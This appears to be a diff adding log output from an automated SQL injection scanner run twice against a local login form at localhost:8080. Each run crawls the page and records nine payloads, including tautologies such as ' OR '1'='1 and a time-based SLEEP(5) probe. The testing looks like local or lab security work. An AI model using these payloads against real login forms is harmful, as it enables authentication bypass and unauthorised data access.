@@ -40,3 +40,27 @@
 2025-09-16 15:51:17,021 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' #
 2025-09-16 15:51:18,082 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'a'='a' /*
 2025-09-16 15:51:19,137 - INFO - SQL Injection testing completed. Report saved to sqli_report.json
+2025-09-16 17:42:42,078 - INFO - Crawling: http://localhost:8080/login.php
+2025-09-16 17:42:43,086 - INFO - Results saved to crawler_output.json
+2025-09-16 17:42:43,086 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1
+2025-09-16 17:42:44,140 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='2
+2025-09-16 17:42:45,190 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1--
+2025-09-16 17:42:46,238 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=2--
+2025-09-16 17:42:47,291 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR SLEEP(5)--
+2025-09-16 17:42:48,342 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="1
+2025-09-16 17:42:49,393 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="2
+2025-09-16 17:42:50,443 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='x
+2025-09-16 17:42:51,495 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='y
+2025-09-16 17:42:52,546 - INFO - SQL Injection testing completed. Report saved to sqli_report.json
+2025-09-16 17:43:56,851 - INFO - Crawling: http://localhost:8080/login.php
+2025-09-16 17:43:57,858 - INFO - Results saved to crawler_output.json
+2025-09-16 17:43:57,858 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='1
+2025-09-16 17:43:58,909 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR '1'='2
+2025-09-16 17:43:59,960 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=1--
+2025-09-16 17:44:01,017 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 1=2--
+2025-09-16 17:44:02,070 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR SLEEP(5)--
+2025-09-16 17:44:03,122 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="1
+2025-09-16 17:44:04,172 - INFO - Testing form at http://localhost:8080/login.php with payload: " OR "1"="2
+2025-09-16 17:44:05,226 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='x
+2025-09-16 17:44:06,278 - INFO - Testing form at http://localhost:8080/login.php with payload: ' OR 'x'='y
+2025-09-16 17:44:07,332 - INFO - SQL Injection testing completed. Report saved to sqli_report.json
